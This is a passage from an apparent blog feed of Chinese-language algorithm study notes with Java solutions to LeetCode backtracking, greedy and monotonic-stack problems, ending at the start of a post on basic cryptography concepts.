class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">helper</span><span class="params">(<span class="type">int</span>[] candidates,<span class="type">int</span> target,<span class="type">int</span> start)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;target)&#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum==target)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;i&lt;candidates.length&amp;&amp;candidates[i]+sum&lt;=target;i++)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(i&gt;start &amp;&amp; candidates[i]==candidates[i-<span class="number">1</span>] )&#123;</span><br><span class="line">                <span class="comment">//有效去除结果集合中的重复元素，因为如果当前元素和前面的元素一样的话，最后的结果也会是一样的，所以再这里就可以不用继续进行递归了</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            helper(candidates,target,i+<span class="number">1</span>);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//法二：使用map</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//结果集合</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//路径集合</span></span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">findSubsequences</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        getSubsequences(nums,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getSubsequences</span><span class="params">( <span class="type">int</span>[] nums, <span class="type">int</span> start )</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(path.size()&gt;<span class="number">1</span> )&#123;</span><br><span class="line">            res.add( <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path) );</span><br><span class="line">            <span class="comment">// 注意这里不要加return，要取树上的节点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//因为这个并不能直接排序之后选择字迹，所以，并不能简单的使用前者和后者相等来判断是否用过当前数字</span></span><br><span class="line">        HashMap&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start ;i &lt; nums.length ;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!path.isEmpty() &amp;&amp; nums[i]&lt; path.getLast())&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使用过了当前数字</span></span><br><span class="line">            <span class="keyword">if</span> ( map.getOrDefault( nums[i],<span class="number">0</span> ) &gt;=<span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i],map.getOrDefault( nums[i],<span class="number">0</span> )+<span class="number">1</span>);</span><br><span class="line">            path.add( nums[i] );</span><br><span class="line">            getSubsequences( nums,i+<span class="number">1</span> );</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全排列</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[] used = <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length];</span><br><span class="line">        helper(nums,used);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">helper</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">boolean</span>[] used)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.size()==nums.length)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(used[i]==<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            path.add(nums[i]);</span><br><span class="line">            helper(nums,used);</span><br><span class="line">            path.removeLast();</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全排列去重</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//存放结果</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//暂存结果</span></span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permuteUnique</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[] used = <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length];</span><br><span class="line">        Arrays.fill(used, <span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        backTrack(nums, used);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backTrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">boolean</span>[] used)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.size() == nums.length) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="comment">// used[i - 1] == true，说明同⼀树⽀nums[i - 1]使⽤过    同一树枝：就是同一条路径到根节点</span></span><br><span class="line">            <span class="comment">// used[i - 1] == false，说明同⼀树层nums[i - 1]使⽤过</span></span><br><span class="line">            <span class="comment">// 如果同⼀树层nums[i - 1]使⽤过则直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] &amp;&amp; used[i - <span class="number">1</span>] == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果同⼀树⽀nums[i]没使⽤过开始处理</span></span><br><span class="line">            <span class="keyword">if</span> (used[i] == <span class="literal">false</span>) &#123;</span><br><span class="line">                used[i] = <span class="literal">true</span>;<span class="comment">//标记同⼀树⽀nums[i]使⽤过，防止同一树枝重复使用</span></span><br><span class="line">                path.add(nums[i]);</span><br><span class="line">                backTrack(nums, used);</span><br><span class="line">                path.remove(path.size() - <span class="number">1</span>);<span class="comment">//回溯，说明同⼀树层nums[i]使⽤过，防止下一树层重复</span></span><br><span class="line">                used[i] = <span class="literal">false</span>;<span class="comment">//回溯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode-cn.com/problems/reconstruct-itinerary/submissions/">https://leetcode-cn.com/problems/reconstruct-itinerary/submissions/</a> 重新做</p>
<p>八皇后问题：</p>
<p>主要是，不能同行、不能同列、不能同对角线</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;String&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">solveNQueens</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[][] chessboard = <span class="keyword">new</span> <span class="title class_">char</span>[n][n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span>[] c: chessboard)&#123;</span><br><span class="line">            Arrays.fill(c,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        helper(n,<span class="number">0</span>,chessboard);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">helper</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> row,<span class="type">char</span>[][] chessboard)</span>&#123;</span><br><span class="line">        <span class="comment">//注意这里不是row==n-1因为如果是这样的话，最后一行是还没有做的</span></span><br><span class="line">        <span class="keyword">if</span>(row==n)&#123;</span><br><span class="line">            result.add(Array2List(chessboard));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> <span class="number">0</span>;col&lt;n;col++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isValid(row,col,n,chessboard))&#123;</span><br><span class="line">                chessboard[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">                helper(n,row+<span class="number">1</span>,chessboard);</span><br><span class="line">                <span class="comment">//回溯</span></span><br><span class="line">                chessboard[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="type">int</span> row,<span class="type">int</span> col,<span class="type">int</span> n,<span class="type">char</span>[][] chessboard)</span>&#123;</span><br><span class="line">        <span class="comment">//检查是否合法，是检查当前行以前的数据，因为后面的数据是空的，还没有填写</span></span><br><span class="line">        <span class="comment">//检查列,同一列不能有皇后</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;row;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(chessboard[i][col]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//检查对角线</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> row-<span class="number">1</span>,j = col-<span class="number">1</span>;i&gt;=<span class="number">0</span>&amp;&amp;j&gt;=<span class="number">0</span>;i--,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(chessboard[i][j]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//检查写对角线</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i= row-<span class="number">1</span>,j = col+<span class="number">1</span>;i&gt;=<span class="number">0</span>&amp;&amp;j&lt;n;i--,j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(chessboard[i][j]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">Array2List</span><span class="params">(<span class="type">char</span>[][] chessboard)</span> &#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span>[] c : chessboard) &#123;</span><br><span class="line">            list.add(String.copyValueOf(c));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解数独</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">solveSudoku</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        helper(board);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(<span class="type">char</span>[][] board)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j&lt;<span class="number">9</span>;j++)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(board[i][j]!=<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">char</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;k&lt;=<span class="string">&#x27;9&#x27;</span>;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(isValid(i,j,k,board))&#123;</span><br><span class="line">                        board[i][j] = k;</span><br><span class="line">                        <span class="keyword">if</span>(helper(board))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        board[i][j]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="type">int</span> row,<span class="type">int</span> col,<span class="type">char</span> value,<span class="type">char</span>[][]board)</span>&#123;</span><br><span class="line">        <span class="comment">//检查行\检查列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(board[i][col]==value||board[row][i]==value)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//检查小方格</span></span><br><span class="line">        <span class="comment">// 9宫格里是否重复</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">startRow</span> <span class="operator">=</span> (row / <span class="number">3</span>) * <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">startCol</span> <span class="operator">=</span> (col / <span class="number">3</span>) * <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startRow; i &lt; startRow + <span class="number">3</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> startCol; j &lt; startCol + <span class="number">3</span>; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == value)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h1><p>每一步局部最优，最后达到整体最优。贪心的主要步骤：</p>
<ul>
<li>将问题分解为若干个子问题</li>
<li>找出适合的贪心策略</li>
<li>求解每一个子问题的最优解</li>
<li>将局部最优解堆叠成全局最优解</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//53. 最大子数组和</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//贪心</span></span><br><span class="line">        <span class="comment">//如果当前和小于0，那么当前和就更新为0</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MIN_VALUE,sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">            <span class="keyword">if</span>(sum&gt;res)&#123;</span><br><span class="line">                res = sum;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                sum = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分发糖果 <a href="https://leetcode-cn.com/problems/candy/">135. 分发糖果</a></p>
<p>如果同时有两个维度需要 考虑的话，一般不要同时考虑，这样很有可能会顾此失彼，所以两个维度一个一个的来要好一点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">candy</span><span class="params">(<span class="type">int</span>[] ratings)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] candy = <span class="keyword">new</span> <span class="title class_">int</span>[ratings.length];</span><br><span class="line">        candy[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//从前往后遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;ratings.length;i++)&#123;</span><br><span class="line">            <span class="comment">//如果当前位置的评分比前面一个朋友的评分高，则糖果+1</span></span><br><span class="line">            <span class="comment">//主要是处理右边大于左边的情况</span></span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i-<span class="number">1</span>])&#123;</span><br><span class="line">                candy[i] = candy[i-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                candy[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> candy[candy.length-<span class="number">1</span>];</span><br><span class="line">        <span class="comment">//从后往前遍历，得到左边大于右边的情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ratings.length-<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//当前糖果是右边的糖果数量+1，和从左边来看，两个之间的最大值</span></span><br><span class="line">                <span class="comment">//特殊情况：如果 </span></span><br><span class="line">                candy[i] = Math.max(candy[i],candy[i+<span class="number">1</span>]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sum += candy[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode-cn.com/problems/queue-reconstruction-by-height/">406. 根据身高重建队列</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] reconstructQueue(<span class="type">int</span>[][] people) &#123;</span><br><span class="line">        <span class="comment">//按身高降序排序，身高相同，k小的站前面</span></span><br><span class="line">        Arrays.sort(people,(a,b)-&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[<span class="number">0</span>]==b[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> a[<span class="number">1</span>] -b[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> b[<span class="number">0</span>] -a[<span class="number">0</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        LinkedList&lt;<span class="type">int</span>[]&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] p: people)&#123;</span><br><span class="line">            <span class="comment">//在队列的指定位置插入数据</span></span><br><span class="line">            queue.add(p[<span class="number">1</span>],p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue.toArray(<span class="keyword">new</span> <span class="title class_">int</span>[people.length][]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/">452. 用最少数量的箭引爆气球</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMinArrowShots</span><span class="params">(<span class="type">int</span>[][] points)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(points.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//按照第一个维度升序进行排序</span></span><br><span class="line">        Arrays.sort(points,(o1,o2)-&gt; Integer.compare(o1[<span class="number">0</span>], o2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;points.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(points[i][<span class="number">0</span>]&gt;points[i-<span class="number">1</span>][<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//不重叠，结果加一</span></span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//表示已经重叠了</span></span><br><span class="line">                <span class="comment">//将左边界更行为重叠中的最小右边界</span></span><br><span class="line">                points[i][<span class="number">1</span>] = Math.min(points[i][<span class="number">1</span>],points[i-<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h1><p><strong>通常是一维数组，要寻找任一个元素的右边或者左边第一个比自己大或者小的元素的位置，此时我们就要想到可以用单调栈了</strong>。</p>
<p>几天后出现更高的温度 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dailyTemperatures(<span class="type">int</span>[] temperatures) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用单调栈，其中栈顶的元素小于栈底的元素</span></span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[temperatures.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;temperatures.length;i++)&#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">            这段代码可以不要</span></span><br><span class="line"><span class="comment">            if(!stack.isEmpty() &amp;&amp; temperatures[i]&lt;=temperatures[stack.peek()])&#123;</span></span><br><span class="line"><span class="comment">                stack.push(i);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; temperatures[i]&gt;temperatures[stack.peek()])&#123;</span><br><span class="line">                result[stack.peek()] = i - stack.peek();</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//这个时候就可以进行压栈了</span></span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环数组：下一个更大的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] nextGreaterElements(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="comment">//使用单调栈</span></span><br><span class="line">        <span class="type">int</span> result[]= <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="number">0</span>);</span><br><span class="line">        Arrays.fill(result,-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这样来模拟数字扩容拼接</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ;i &lt;nums.length*<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; nums[i%nums.length]&gt;nums[stack.peek()])&#123;</span><br><span class="line">                result[stack.peek()] = nums[i%nums.length];</span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i%nums.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>code</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学基础</title>
    <url>/2022/06/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ol>
<li>对称密码：加解密密钥相同：RC4、DES、AES<ul>
<li>序列密码：对明文逐字符加密</li>
<li>分组密码：将明文分组，分别对每一组进行加密</li>
</ul>
</li>
<li>非对称密码：加解密密钥不同：RSA、ECC椭圆曲线</li>
<li>hash函数：不同长度的输入，输出固定长度的摘要</li>
</ol>
<p>编码:</p>
<ul>
<li>base64:基于<strong>可打印的64个字符</strong>来表示二进制数据的一种方式</li>
